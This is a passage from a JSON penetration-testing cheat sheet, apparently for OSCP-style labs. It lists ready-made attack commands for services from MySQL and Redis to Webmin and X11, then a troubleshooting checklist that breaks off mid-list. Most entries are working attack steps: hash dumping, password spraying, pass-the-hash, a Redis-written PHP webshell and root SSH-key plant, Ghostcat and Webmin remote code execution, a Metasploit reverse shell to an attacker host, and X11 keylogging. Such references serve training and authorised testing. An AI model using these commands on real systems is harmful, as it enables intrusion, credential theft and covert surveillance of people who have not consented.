     "cmd": "mysql -h <TARGET_IP> -u <USER> -p'<PASS>' --ssl=0 -e 'select host,user,authentication_string from mysql.user;' && mysqldump -h <TARGET_IP> -u <USER> -p'<PASS>' --all-databases > mysql_dump.sql",
     "when": "if creds known"
    },
    {
     "label": "Credential spray",
     "cmd": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt mysql://<TARGET_IP> -t 4 -f",
     "when": "if no creds"
    }
   ]
  },
  {
   "ports": [
    3389
   ],
   "service": "rdp",
   "note": "The pre-auth screenshot is the cheapest recon on the box: with NLA disabled, `--nla-screenshot` shows you the domain name and the last logged-on username without a single credential. `rdp-ntlm-info` gives you the same NetBIOS/DNS/domain data even with NLA on. Pass-the-hash over RDP only works when Restricted Admin mode is enabled on the target.",
   "commands": [
    {
     "label": "Host, domain and NLA state",
     "cmd": "nmap -p3389 --script rdp-ntlm-info,rdp-enum-encryption <TARGET_IP> -oN nmap_rdp.txt",
     "when": "always"
    },
    {
     "label": "Pre-auth login-screen screenshot",
     "cmd": "nxc rdp <TARGET_IP> --nla-screenshot",
     "when": "if NLA disabled"
    },
    {
     "label": "Validate credentials",
     "cmd": "nxc rdp <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>",
     "when": "if creds known"
    },
    {
     "label": "Interactive session",
     "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /p:'<PASS>' /d:<DOMAIN> /cert-ignore /dynamic-resolution +clipboard /drive:share,/tmp/share",
     "when": "if creds known"
    },
    {
     "label": "Pass-the-hash (Restricted Admin)",
     "cmd": "xfreerdp /v:<TARGET_IP> /u:<USER> /pth:<NTLM_HASH> /d:<DOMAIN> /cert-ignore /dynamic-resolution",
     "when": "if hash known and Restricted Admin enabled"
    },
    {
     "label": "Post-login desktop screenshot",
     "cmd": "nxc rdp <TARGET_IP> -u <USER> -p '<PASS>' --screenshot --screentime 10",
     "when": "if creds known"
    }
   ]
  },
  {
   "ports": [
    5432
   ],
   "service": "postgres",
   "note": "`postgres:postgres` and local `trust` auth are still everywhere. For a superuser, `COPY ... FROM PROGRAM` is documented command execution (9.3+, the CVE-2019-9193 argument) and beats hunting for an extension trick. Also remember postgres will happily tell you which databases exist before you find the interesting one — never stop at the default `postgres` DB.",
   "commands": [
    {
     "label": "Try default credentials",
     "cmd": "PGPASSWORD=postgres psql -h <TARGET_IP> -U postgres -d postgres -c 'select version(), current_user;'",
     "when": "always"
    },
    {
     "label": "List databases and roles",
     "cmd": "PGPASSWORD='<PASS>' psql -h <TARGET_IP> -U <USER> -l && PGPASSWORD='<PASS>' psql -h <TARGET_IP> -U <USER> -d postgres -c '\\du'",
     "when": "if creds known"
    },
    {
     "label": "Dump password hashes",
     "cmd": "PGPASSWORD='<PASS>' psql -h <TARGET_IP> -U <USER> -d postgres -c 'select usename, passwd from pg_shadow;'",
     "when": "if superuser"
    },
    {
     "label": "Command execution via COPY FROM PROGRAM",
     "cmd": "PGPASSWORD='<PASS>' psql -h <TARGET_IP> -U <USER> -d postgres -c \"DROP TABLE IF EXISTS cmd; CREATE TABLE cmd(o text); COPY cmd FROM PROGRAM 'id'; SELECT * FROM cmd;\"",
     "when": "if superuser"
    },
    {
     "label": "Read arbitrary files",
     "cmd": "PGPASSWORD='<PASS>' psql -h <TARGET_IP> -U <USER> -d postgres -c \"select pg_read_file('/etc/passwd');\"",
     "when": "if superuser or pg_read_server_files role"
    },
    {
     "label": "Credential spray",
     "cmd": "nmap -p5432 -sCV --script pgsql-brute <TARGET_IP> -oN nmap_pgsql.txt",
     "when": "if no creds"
    }
   ]
  },
  {
   "ports": [
    5601
   ],
   "service": "kibana",
   "note": "`/api/status` returns the exact version unauthenticated, which is what decides whether the known Kibana RCEs apply (CVE-2019-7609 prototype pollution on <6.6.1/<5.6.15, CVE-2018-17246 LFI on <6.4.3). The structural miss: the console proxy endpoint lets you query the backing Elasticsearch through Kibana even when 9200 is firewalled from you.",
   "commands": [
    {
     "label": "Exact version and plugin list",
     "cmd": "curl -sk http://<TARGET_IP>:5601/api/status | jq '{version: .version, plugins: [.status.statuses[]?.id]}'",
     "when": "always"
    },
    {
     "label": "Query Elasticsearch through the console proxy",
     "cmd": "curl -sk -X POST 'http://<TARGET_IP>:5601/api/console/proxy?path=_cat/indices%3Fv&method=GET' -H 'kbn-xsrf: true'",
     "when": "always"
    },
    {
     "label": "Pull documents through the proxy",
     "cmd": "curl -sk -X POST 'http://<TARGET_IP>:5601/api/console/proxy?path=_all/_search%3Fsize%3D50&method=GET' -H 'kbn-xsrf: true' | jq .",
     "when": "if proxy reachable"
    },
    {
     "label": "Saved objects (often hold connection strings)",
     "cmd": "curl -sk 'http://<TARGET_IP>:5601/api/saved_objects/_find?type=config&type=index-pattern&per_page=100' | jq .",
     "when": "always"
    },
    {
     "label": "Endpoint discovery",
     "cmd": "feroxbuster -u http://<TARGET_IP>:5601 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt --depth 2 -o ferox_kibana.txt",
     "when": "always"
    },
    {
     "label": "Authenticated check",
     "cmd": "curl -sk -u '<USER>:<PASS>' http://<TARGET_IP>:5601/api/security/v1/me | jq .",
     "when": "if creds known"
    }
   ]
  },
  {
   "ports": [
    5900,
    5901,
    5902,
    5903,
    5904,
    5905
   ],
   "service": "vnc",
   "note": "Display :0 may demand a password while :1/:2 on 5901/5902 sit wide open — always scan the whole 5900-5910 range, not just 5900. VNC passwords are DES-encrypted with a fixed key and truncated to 8 characters, so any `~/.vnc/passwd` you find elsewhere on the network decrypts instantly and is worth trying here.",
   "commands": [
    {
     "label": "Auth types and title across all displays",
     "cmd": "nmap -p5900-5910 -sCV --script vnc-info,vnc-title,realvnc-auth-bypass <TARGET_IP> -oN nmap_vnc.txt",
     "when": "always"
    },
    {
     "label": "Connect (no auth / known password)",
     "cmd": "vncviewer <TARGET_IP>:<PORT>",
     "when": "always"
    },
    {
     "label": "Screenshot without interacting",
     "cmd": "nxc vnc <TARGET_IP> -p '<PASS>' --screenshot --screentime 5",
     "when": "always"
    },
    {
     "label": "Connect with a recovered passwd file",
     "cmd": "vncviewer -passwd ./passwd <TARGET_IP>:<PORT>",
     "when": "if a .vnc/passwd file was found"
    },
    {
     "label": "Decrypt a stored VNC password",
     "cmd": "echo -n '<HEX>' | xxd -r -p > vnc.bin && vncpwd vnc.bin",
     "when": "if an encrypted password blob was found"
    },
    {
     "label": "Password brute force",
     "cmd": "hydra -P /usr/share/wordlists/rockyou.txt -s <PORT> vnc://<TARGET_IP> -t 4 -f",
     "when": "if VNC auth required"
    }
   ]
  },
  {
   "ports": [
    5985,
    5986
   ],
   "service": "winrm",
   "note": "An open 5985 says nothing about whether *your* user can use it — membership in Remote Management Users or local Administrators is required, and netexec only prints `Pwn3d!` when execution actually succeeds. 5986 is HTTPS and needs `-S` on evil-winrm plus usually `-c`/`-k` for cert auth; and WinRM accepts pass-the-hash directly, so a dumped NTLM hash is as good as the password.",
   "commands": [
    {
     "label": "Validate access (Pwn3d! = shell)",
     "cmd": "nxc winrm <TARGET_IP> -u <USER> -p '<PASS>' -d <DOMAIN>",
     "when": "if creds known"
    },
    {
     "label": "Interactive shell",
     "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>'",
     "when": "if nxc reports Pwn3d!"
    },
    {
     "label": "Pass-the-hash shell",
     "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -H <NTLM_HASH>",
     "when": "if NTLM hash known"
    },
    {
     "label": "HTTPS listener",
     "cmd": "evil-winrm -i <TARGET_IP> -u <USER> -p '<PASS>' -S -P 5986",
     "when": "if only 5986 open"
    },
    {
     "label": "Spray a known password across users",
     "cmd": "nxc winrm <TARGET_IP> -u users.txt -p '<PASS>' -d <DOMAIN> --continue-on-success",
     "when": "if a password is known but not the user"
    },
    {
     "label": "Confirm the endpoint is really WinRM",
     "cmd": "curl -s -o /dev/null -w '%{http_code}\\n' http://<TARGET_IP>:5985/wsman",
     "when": "always"
    }
   ]
  },
  {
   "ports": [
    6379
   ],
   "service": "redis",
   "note": "`INFO` is free even under protected-mode and gives you the OS, the redis version and `config_file` — which tells you where you are on disk. Unauthenticated write access is RCE three ways: `CONFIG SET dir` + `dbfilename` to drop a webshell or an authorized_keys, or `MODULE LOAD` on 4.x+. Protected mode blocks writes from remote but reads still work, so do not skip the enumeration.",
   "commands": [
    {
     "label": "Version, OS and config path",
     "cmd": "redis-cli -h <TARGET_IP> INFO | tee redis_info.txt",
     "when": "always"
    },
    {
     "label": "Enumerate keys and values",
     "cmd": "redis-cli -h <TARGET_IP> --scan | head -100 && redis-cli -h <TARGET_IP> --bigkeys",
     "when": "if unauthenticated"
    },
    {
     "label": "Check writability and current dir",
     "cmd": "redis-cli -h <TARGET_IP> CONFIG GET dir && redis-cli -h <TARGET_IP> CONFIG GET dbfilename",
     "when": "if unauthenticated"
    },
    {
     "label": "SSH key write to root",
     "cmd": "(echo -e '\\n\\n'; cat ~/.ssh/id_rsa.pub; echo -e '\\n\\n') > key.txt && redis-cli -h <TARGET_IP> -x SET crackit < key.txt && redis-cli -h <TARGET_IP> CONFIG SET dir /root/.ssh/ && redis-cli -h <TARGET_IP> CONFIG SET dbfilename authorized_keys && redis-cli -h <TARGET_IP> SAVE",
     "when": "if CONFIG SET allowed"
    },
    {
     "label": "Webshell write",
     "cmd": "redis-cli -h <TARGET_IP> CONFIG SET dir /var/www/html && redis-cli -h <TARGET_IP> CONFIG SET dbfilename shell.php && redis-cli -h <TARGET_IP> SET x '<?php system($_GET[\"c\"]); ?>' && redis-cli -h <TARGET_IP> SAVE",
     "when": "if CONFIG SET allowed and webroot known"
    },
    {
     "label": "Authenticated access",
     "cmd": "redis-cli -h <TARGET_IP> -a '<PASS>' --no-auth-warning INFO",
     "when": "if password known"
    }
   ]
  },
  {
   "ports": [
    8009
   ],
   "service": "ajp",
   "note": "AJP is Tomcat's back-door connector and it trusts whatever the front end tells it — Ghostcat (CVE-2020-1938) reads any file under the webapp root, including WEB-INF/web.xml and the manager credentials, even when 8080 is locked down or behind auth. If the app supports file upload, Ghostcat escalates from file read to RCE by including the uploaded file as a JSP.",
   "commands": [
    {
     "label": "Confirm AJP and probe methods",
     "cmd": "nmap -p8009 -sCV --script ajp-methods,ajp-headers,ajp-request <TARGET_IP> -oN nmap_ajp.txt",
     "when": "always"
    },
    {
     "label": "Ghostcat file read",
     "cmd": "python3 ajpShooter.py http://<TARGET_IP>:8080 8009 /WEB-INF/web.xml read",
     "when": "always"
    },
    {
     "label": "Ghostcat via metasploit",
     "cmd": "msfconsole -q -x 'use auxiliary/admin/http/tomcat_ghostcat; set RHOSTS <TARGET_IP>; set RPORT 8009; set FILENAME /WEB-INF/web.xml; run; exit'",
     "when": "always"
    },
    {
     "label": "Pull tomcat-users.xml for manager creds",
     "cmd": "python3 ajpShooter.py http://<TARGET_IP>:8080 8009 /WEB-INF/../../conf/tomcat-users.xml read",
     "when": "if Ghostcat works"
    },
    {
     "label": "Ghostcat to RCE via uploaded file",
     "cmd": "python3 ajpShooter.py http://<TARGET_IP>:8080 8009 /uploads/shell.txt eval",
     "when": "if file upload available"
    }
   ]
  },
  {
   "ports": [
    9200,
    9300
   ],
   "service": "elasticsearch",
   "note": "Start at `_cat/indices?v`, not at `_search` — index names tell you what the data is and stop you dumping gigabytes of logs. The version at `/` decides which RCEs apply (Groovy/MVEL sandbox escapes on 1.x). And 9300 is the transport port: a separate, often-forgotten surface where an unauthenticated node can join the cluster.",
   "commands": [
    {
     "label": "Version and cluster name",
     "cmd": "curl -s http://<TARGET_IP>:9200/ | jq .",
     "when": "always"
    },
    {
     "label": "List indices",
     "cmd": "curl -s 'http://<TARGET_IP>:9200/_cat/indices?v&s=store.size:desc'",
     "when": "always"
    },
    {
     "label": "Dump an interesting index",
     "cmd": "curl -s 'http://<TARGET_IP>:9200/<INDEX>/_search?pretty&size=100' | jq '.hits.hits[]._source'",
     "when": "if indices readable"
    },
    {
     "label": "Cluster and node detail (leaks paths and internal IPs)",
     "cmd": "curl -s 'http://<TARGET_IP>:9200/_nodes?pretty' | jq '.nodes[] | {name, host, version, settings: .settings.path}'",
     "when": "always"
    },
    {
     "label": "Search every index for credential-ish fields",
     "cmd": "curl -s 'http://<TARGET_IP>:9200/_all/_search?pretty&q=password%20OR%20passwd%20OR%20secret%20OR%20token&size=50' | jq '.hits.hits[]._source'",
     "when": "if unauthenticated"
    },
    {
     "label": "Authenticated check / user list",
     "cmd": "curl -s -u '<USER>:<PASS>' 'http://<TARGET_IP>:9200/_security/user?pretty'",
     "when": "if creds known and X-Pack enabled"
    }
   ]
  },
  {
   "ports": [
    11211
   ],
   "service": "memcached",
   "note": "`stats items` then `stats cachedump <slab_id> 0` is the classic key dump, but cachedump was removed in 1.6 — there you need `lru_crawler metadump all`, which is what people miss when they conclude the server is empty. Memcached also listens on UDP by default on older builds, so it can answer on UDP 11211 when TCP is filtered. Sessions and API tokens are the prize.",
   "commands": [
    {
     "label": "Server stats and version",
     "cmd": "printf 'stats\\nquit\\n' | nc -q1 -nv <TARGET_IP> 11211",
     "when": "always"
    },
    {
     "label": "Enumerate slabs",
     "cmd": "printf 'stats items\\nstats slabs\\nquit\\n' | nc -q1 -nv <TARGET_IP> 11211",
     "when": "always"
    },
    {
     "label": "Dump keys (memcached < 1.6)",
     "cmd": "printf 'stats cachedump 1 0\\nquit\\n' | nc -q1 -nv <TARGET_IP> 11211",
     "when": "if version < 1.6"
    },
    {
     "label": "Dump keys (memcached >= 1.6)",
     "cmd": "printf 'lru_crawler metadump all\\nquit\\n' | nc -q1 -nv <TARGET_IP> 11211",
     "when": "if version >= 1.6"
    },
    {
     "label": "Retrieve a value",
     "cmd": "printf 'get <KEY>\\nquit\\n' | nc -q1 -nv <TARGET_IP> 11211",
     "when": "if keys enumerated"
    },
    {
     "label": "NSE + UDP check",
     "cmd": "nmap -p11211 -sCV --script memcached-info <TARGET_IP> && nmap -sU -p11211 --script memcached-info <TARGET_IP>",
     "when": "always"
    }
   ]
  },
  {
   "ports": [
    27017,
    27018,
    28017
   ],
   "service": "mongodb",
   "note": "`listDatabases` failing is not proof of auth — a bound-to-localhost-only mongo behind a proxy behaves the same way; check the error text. If you get in, `admin.system.users` holds SCRAM-SHA-1 hashes you can crack offline (hashcat -m 24100/24200), and 28017 was the old HTTP status interface on 2.x that leaks everything without auth.",
   "commands": [
    {
     "label": "Unauthenticated database listing",
     "cmd": "mongosh --host <TARGET_IP> --port 27017 --quiet --eval 'JSON.stringify(db.adminCommand({listDatabases:1}))'",
     "when": "always"
    },
    {
     "label": "NSE",
     "cmd": "nmap -p27017,27018,28017 -sCV --script mongodb-info,mongodb-databases <TARGET_IP> -oN nmap_mongo.txt",
     "when": "always"
    },
    {
     "label": "Enumerate collections in every database",
     "cmd": "mongosh --host <TARGET_IP> --quiet --eval 'db.adminCommand({listDatabases:1}).databases.forEach(d=>{print(d.name); print(db.getSiblingDB(d.name).getCollectionNames())})'",
     "when": "if unauthenticated"
    },
    {
     "label": "Dump credential hashes",
     "cmd": "mongosh --host <TARGET_IP> --quiet --eval 'JSON.stringify(db.getSiblingDB(\"admin\").system.users.find().toArray())'",
     "when": "if unauthenticated or admin access"
    },
    {
     "label": "Authenticated connection",
     "cmd": "mongosh 'mongodb://<USER>:<PASS>@<TARGET_IP>:27017/admin'",
     "when": "if creds known"
    },
    {
     "label": "Legacy HTTP status interface",
     "cmd": "curl -s http://<TARGET_IP>:28017/ && curl -s http://<TARGET_IP>:28017/serverStatus?text=1",
     "when": "if 28017 open (mongo 2.x)"
    }
   ]
  },
  {
   "ports": [
    10000,
    20000
   ],
   "service": "webmin",
   "note": "Webmin runs as root, so any bug here is an immediate root shell — no privesc stage. Version matters absolutely: CVE-2019-15107 (1.882-1.921) is unauthenticated RCE but only when the 'password change' feature is enabled, so a matching version alone is not a finding. It is HTTPS by default, which is why a plain http:// curl looks dead. 20000 is Usermin, the same codebase.",
   "commands": [
    {
     "label": "Fingerprint and exact version",
     "cmd": "curl -sk https://<TARGET_IP>:10000/ | grep -iE 'webmin|usermin|version' | head -5 && nmap -p10000 -sCV <TARGET_IP> -oN nmap_webmin.txt",
     "when": "always"
    },
    {
     "label": "Check whether password_change.cgi is exposed",
     "cmd": "curl -sk -o /dev/null -w '%{http_code}\\n' https://<TARGET_IP>:10000/password_change.cgi",
     "when": "always"
    },
    {
     "label": "CVE-2019-15107 unauthenticated RCE probe",
     "cmd": "curl -sk 'https://<TARGET_IP>:10000/password_change.cgi' -H 'Referer: https://<TARGET_IP>:10000/' --data \"user=root&pam=&expired=2&old=test|id&new1=test&new2=test\"",
     "when": "if version 1.882-1.921 and password_change.cgi present"
    },
    {
     "label": "Metasploit module",
     "cmd": "msfconsole -q -x 'use exploit/linux/http/webmin_backdoor; set RHOSTS <TARGET_IP>; set RPORT 10000; set SSL true; set LHOST <ATTACKER_IP>; set LPORT <LPORT>; run'",
     "when": "if vulnerable version confirmed"
    },
    {
     "label": "Authenticated command execution",
     "cmd": "curl -sk -u '<USER>:<PASS>' 'https://<TARGET_IP>:10000/shell/index.cgi' --data 'cmd=id'",
     "when": "if creds known"
    },
    {
     "label": "Credential spray",
     "cmd": "hydra -l root -P /usr/share/wordlists/rockyou.txt <TARGET_IP> -s 10000 https-post-form '/session_login.cgi:page=%2F&user=^USER^&pass=^PASS^:F=Login failed' -f",
     "when": "if no creds"
    }
   ]
  },
  {
   "ports": [
    5000,
    5001
   ],
   "service": "docker-registry",
   "note": "`/v2/_catalog` is anonymous far more often than people expect, and the payoff is not the images themselves but the layer blobs: config files, .env files, private keys and hardcoded credentials baked into intermediate layers. The image config JSON (`Config.Env` and the build history) frequently shows secrets passed as build args, without ever downloading a layer.",
   "commands": [
    {
     "label": "Confirm registry API and list repositories",
     "cmd": "curl -sk https://<TARGET_IP>:5000/v2/_catalog | jq . || curl -s http://<TARGET_IP>:5000/v2/_catalog | jq .",
     "when": "always"
    },
    {
     "label": "List tags per repository",
     "cmd": "curl -s http://<TARGET_IP>:5000/v2/<REPO>/tags/list | jq .",
     "when": "if catalog readable"
    },
    {
     "label": "Read image config for env vars and build history",
     "cmd": "curl -s -H 'Accept: application/vnd.docker.distribution.manifest.v2+json' http://<TARGET_IP>:5000/v2/<REPO>/manifests/<TAG> | jq -r '.config.digest' | xargs -I{} curl -s http://<TARGET_IP>:5000/v2/<REPO>/blobs/{} | jq '.config.Env, .history'",
     "when": "if catalog readable"
    },
    {
     "label": "Pull the image and inspect locally",
     "cmd": "docker pull <TARGET_IP>:5000/<REPO>:<TAG> && docker history --no-trunc <TARGET_IP>:5000/<REPO>:<TAG>",
     "when": "if pull allowed"
    },
    {
     "label": "Automated secret extraction",
     "cmd": "python3 DockerRegistryGrabber.py http://<TARGET_IP> --dump_all",
     "when": "if catalog readable"
    },
    {
     "label": "Authenticated access",
     "cmd": "curl -s -u '<USER>:<PASS>' http://<TARGET_IP>:5000/v2/_catalog | jq .",
     "when": "if creds known"
    }
   ]
  },
  {
   "ports": [
    6000,
    6001,
    6002,
    6003,
    6004,
    6005
   ],
   "service": "x11",
   "note": "`xhost +` leaves the display world-open, and the point is not that you can draw windows — it is that you can key-log the console user's session with xspy/xwd and screenshot whatever they are typing, including passwords into a root terminal. Check for the `-nolisten tcp` default being disabled; that is the whole precondition.",
   "commands": [
    {
     "label": "Check for open access control",
     "cmd": "nmap -p6000-6005 -sCV --script x11-access <TARGET_IP> -oN nmap_x11.txt",
     "when": "always"
    },
    {
     "label": "Confirm the display is usable",
     "cmd": "xdpyinfo -display <TARGET_IP>:0 | head -20",
     "when": "always"
    },
    {
     "label": "Screenshot the desktop",
     "cmd": "xwd -root -screen -silent -display <TARGET_IP>:0 > screen.xwd && convert screen.xwd screen.png",
     "when": "if display open"
    },
    {
     "label": "Keylog the session",
     "cmd": "xspy -display <TARGET_IP>:0",
     "when": "if display open"
    },
    {
     "label": "Open a shell on the victim's display",
     "cmd": "xterm -display <TARGET_IP>:0",
     "when": "if display open"
    }
   ]
  }
 ],
 "stuck": [
  {
   "focus": "network",
   "phase": "recon",
   "items": [
    {
     "text": "Did you actually scan all 65535 TCP ports, or did you stop at nmap's default top-1000?",
     "why": "The one interesting port is above 1024 far more often than chance suggests, and the default scan silently omits 64,000 of them.",
     "cmd": "nmap -p- --min-rate 5000 -Pn -oA full $IP"
    },
    {
     "text": "Have you touched UDP at all, even once?",
     "why": "SNMP/161, TFTP/69, IKE/500, NFS/2049 each own an entire box, and a TCP-only workflow never sees them.",
     "cmd": "nmap -sU --top-ports 200 -oA udp $IP"
    },
    {
     "text": "Did your fast full-port scan actually reach the host, or did rate-limiting drop packets? Re-scan slowly and compare.",
     "why": "A high --min-rate against a filtered or throttled host produces silent false negatives — people 'finish' a full scan that found nothing because the probes never landed.",
     "cmd": "nmap -p- -T2 -Pn --max-retries 3 $IP"
    },
    {
     "text": "Did you run version + default scripts against the ports you found, or read the banner once and move on?",
     "why": "-sVC output is where the hostname, domain, vhost, and exact build number fall out — and the exact build is what decides which exploit works.",
     "cmd": "nmap -sVC -p $PORTS -oA deep $IP"
    },
    {
     "text": "Every hostname you have seen — is it in /etc/hosts, and did you re-request the site by name?",
     "why": "Name-based virtual hosting means the IP serves a decoy default page while the real application only answers to the hostname.",
     "cmd": "echo \"$IP box.local\" | sudo tee -a /etc/hosts"
    },
    {
     "text": "Have you harvested names out of band: TLS cert CN/SAN, SMB computer name, LDAP naming context, HTTP redirects, SMTP banner?",
     "why": "The certificate alone usually hands you the domain, the internal hostname and sometimes a second service you had not found.",
     "cmd": "openssl s_client -connect $IP:443 </dev/null 2>/dev/null | openssl x509 -noout -text | grep -A1 'Alternative'"
    },
    {
     "text": "Are you scanning the right machine at all — VPN up, correct subnet, no typo'd octet, target not reverted to a new IP?",
     "why": "Entire hours get spent enumerating a host that was never the target; it costs ten seconds to rule out.",
     "cmd": "ip a show tun0; ping -c2 $IP"
    },
    {
     "text": "If everything is filtered, have you tried a trusted source port?",
     "why": "Lazy ACLs allow-list source ports 53/88/123, and the whole host appears to open up.",
     "cmd": "nmap --source-port 53 -p- -Pn $IP"
    },
    {
     "text": "Is the host dual-stacked? Have you scanned its IPv6 address?",
     "why": "Host firewalls are routinely written for v4 only, so the same services sit wide open on v6.",
     "cmd": "nmap -6 -p- $IP6"
    },
    {
     "text": "What is the scan telling you that isn't a port — TTL, OS guess, closed vs filtered, RST behaviour?",
     "why": "'Filtered everywhere' is itself the finding: it means host-based filtering and changes your whole approach rather than justifying another scan.",
     "cmd": ""
    },
    {
     "text": "Re-read the brief and your own first-20-minutes notes, slowly, before running anything else.",
     "why": "The string you need is very often already in your notes and you stopped seeing it an hour ago.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "network",
   "phase": "enumeration",
   "items": [
    {
     "text": "Pick the weirdest, highest-numbered, least familiar port and go deep on that one for 30 minutes.",
     "why": "The intended path is on the unusual service far more often than on 22/80 — the unfamiliar port is unfamiliar to you, not to the author.",
     "cmd": ""
    },
    {
     "text": "Have you tried anonymous/guest/default on every single service — FTP anon, SMB null AND guest, LDAP anon bind, SNMP public, MSSQL sa, Redis/Mongo/Elastic unauthenticated, VNC no-auth?",
     "why": "The 'authenticated' wall usually isn't one, and null vs guest are different tests that people conflate.",
     "cmd": "netexec smb $IP -u '' -p '' --shares; netexec smb $IP -u guest -p '' --shares"
    },
    {
     "text": "List every credential you own and every service that accepts credentials. Is that matrix actually complete, including username-as-password?",
     "why": "Credential reuse across services is the single most common unlock in both labs and real networks, and nobody ever finishes the matrix.",
     "cmd": "netexec smb $IP -u users.txt -p pass.txt --continue-on-success"
    },
    {
     "text": "Did you read every file you pulled off that share/FTP, including the boring config and the old backup?",
     "why": "Passwords live in web.config, unattend.xml, .bak, .kdbx, .git and 'notes.txt' — downloading is not reading.",
     "cmd": ""
    },
    {
     "text": "Have you built a user list from anywhere at all — RID cycling, SMTP VRFY/RCPT, LDAP, kerbrute, web app error messages, file share ownership?",
     "why": "Without a user list you cannot spray, and 'no valid users' is what 'no way in' usually actually means.",
     "cmd": "netexec smb $IP -u guest -p '' --rid-brute"
    },
    {
     "text": "Did you searchsploit the exact version string — all three digits — and then read the exploit source before running it?",
     "why": "Most 'the exploit doesn't work' is a hardcoded path, port or offset in someone else's PoC that took 30 seconds to fix.",
     "cmd": "searchsploit -w \"$PRODUCT $VERSION\""
    },
    {
     "text": "Have you run the protocol's own client instead of poking it with nc?",
     "why": "Many services only reveal their version, banner and command set after a proper handshake, and a raw connect shows you nothing.",
     "cmd": ""
    },
    {
     "text": "NSE has hundreds of service-specific scripts you skipped. Have you run the vuln/safe categories against that port?",
     "why": "It is cheap, allowed on every OffSec exam, and routinely names the exact CVE you were about to spend an hour finding.",
     "cmd": "nmap --script 'vuln or safe' -p $PORT $IP"
    },
    {
     "text": "If SNMP is open, did you walk the whole tree or just the system branch?",
     "why": "Full walks leak process lists, running command lines with passwords in them, users and installed software; the default walk shows none of it.",
     "cmd": "snmpbulkwalk -c public -v2c $IP ."
    },
    {
     "text": "NFS exports enumerated and mounted? DNS zone transfer attempted against every nameserver you found?",
     "why": "Both are one command, both are frequently the intended path, and both are skipped because they feel old-fashioned.",
     "cmd": "showmount -e $IP; dig axfr @$IP $DOMAIN"
    },
    {
     "text": "Has the box been reset, restarted, or changed since your scan data was collected?",
     "why": "A service that starts late or a host someone else reverted invalidates every negative result you are currently trusting.",
     "cmd": ""
    },
    {
     "text": "What is this machine actually FOR? Name it in one sentence, then attack that purpose.",
     "why": "Boxes and servers are built around a function; the way in is nearly always an abuse of that function rather than a stray CVE.",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "network",
   "phase": "foothold",
   "items": [
    {
     "text": "Prove your callback path works at all — curl or ping your own box from the target context before you blame the exploit.",
     "why": "Blocked egress masquerades as a broken exploit for hours; a trivial in-band test settles it in one request.",
     "cmd": "sudo tcpdump -i tun0 -n 'host '$IP"
    },
    {
     "text": "Did the exploit actually fail, or did it succeed somewhere you weren't watching — wrong interface, wrong listener, shell died instantly?",
     "why": "Binding a listener on eth0 while the target reaches you on tun0 is a standard hour of lost time, and the exploit output looks identical either way.",
     "cmd": "ss -lntp; ip a"
    },
    {
     "text": "Have you tried the reverse shell on 80, 443 or 53 instead of 4444?",
     "why": "Egress filters allow those three and drop everything else — same exploit, different port, instant shell.",
     "cmd": ""
    },
    {
     "text": "If nothing gets out, have you inverted it: bind shell, or a pure in-band web/app shell with no callback at all?",
     "why": "If outbound is fully blocked, no amount of payload variation will ever produce a reverse shell.",
     "cmd": ""
    },
    {
     "text": "Have you cycled payload flavours — bash -i, mkfifo, python3, perl, php, busybox nc, powershell -enc — rather than re-running the same one?",
     "why": "Which interpreter exists on the target, and how the injection point mangles quotes and spaces, decides which one-liner survives.",
     "cmd": ""
    },
    {
     "text": "Is your payload being mangled in transit — URL-encoded, space-stripped, quote-escaped, length-capped?",
     "why": "The technique is right and the transport corrupts it; ${IFS} and base64-decode-then-pipe recover most of these cases.",
     "cmd": "echo -n '$PAYLOAD' | base64 -w0"
    },
    {
     "text": "Did you read the public exploit's prerequisites — does it need auth you have, a writable directory, a specific config toggle?",
     "why": "Most PoCs silently assume a precondition; the exploit isn't failing, it never started.",
     "cmd": ""
    },
    {
     "text": "Wrong architecture or wrong build? 32 vs 64-bit, service pack, distro package version.",
     "why": "A near-miss version is a hard fail for anything memory-corruption based, and the error message rarely says so.",
     "cmd": ""
    },
    {
     "text": "Is the box in a bad state from your own failed attempts? Revert it and re-verify one known-good step.",
     "why": "After you crash a service, every subsequent negative result is meaningless — and people keep testing for hours against a broken target.",
     "cmd": ""
    },
    {
     "text": "Go back to the second-best finding you dismissed. What was it?",
     "why": "Tunnel vision on the first shiny vulnerability is the most common reason a foothold takes eight hours instead of one.",
     "cmd": ""
    },
    {
     "text": "Did you take a partial win as far as it goes — LFI to config to DB creds to SSH, directory listing to backup file, low-priv web function to file write?",
     "why": "Chains get abandoned at step two because step two isn't a shell; the shell is at step four.",
     "cmd": ""
    },
    {
     "text": "Have you sprayed every password you now hold at SSH/WinRM/RDP/SMB for every user you know, including as their own username?",
     "why": "The credential you already own opens the service you already found, and that combination is checked last instead of first.",
     "cmd": ""
    },
    {
     "text": "On OSCP+, Metasploit and Meterpreter may be used against exactly one target machine and never for pivoting — have you decided which machine that is, or are you hoarding it?",
     "why": "Candidates save the allowance all exam and never spend it. Verified: https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide",
     "cmd": ""
    }
   ]
  },
  {
   "focus": "network",
   "phase": "privesc-linux",
   "items": [
    {
     "text": "Did you re-run the entire enumeration loop AS the user you just became — sudo -l, groups, home directory, mail, cron, their own files?",
     "why": "The whole point of that account is something only it can see; people run linpeas once as www-data and never again.",
     "cmd": "sudo -l; id; ls -la ~"
    },
    {
     "text": "sudo -l — did you read the flags and the env_keep/SETENV line, not just the binary name, and check GTFOBins for that exact invocation?",
     "why": "Sudo entries are the most common intended Linux path, and the LD_PRELOAD/env_keep detail is the half everybody skips.",
     "cmd": "sudo -l"
    },
    {
     "text": "Have you read the user's dotfiles and history by hand: .bash_history, .ssh/, .config, .netrc, .my.cnf, .git-credentials, .env?",
     "why": "Automated tools print these and humans scroll past them; the password is on screen already.",
     "cmd": "ls -la ~; cat ~/.bash_history"
    },
    {
     "text": "Try every password you already own with su for root and for every other local user.",
     "why": "Reuse to root is boringly common and takes fifteen seconds to rule out.",
     "cmd": "su - root"
    },
    {
     "text": "What is listening on 127.0.0.1 that you could not see from outside?",
     "why": "Internal-only admin panels, databases and message queues are the reason the foothold exists in the first place.",
     "cmd": "ss -lntup"
    },
    {
     "text": "Have you watched the box run for two minutes instead of reading crontab?",
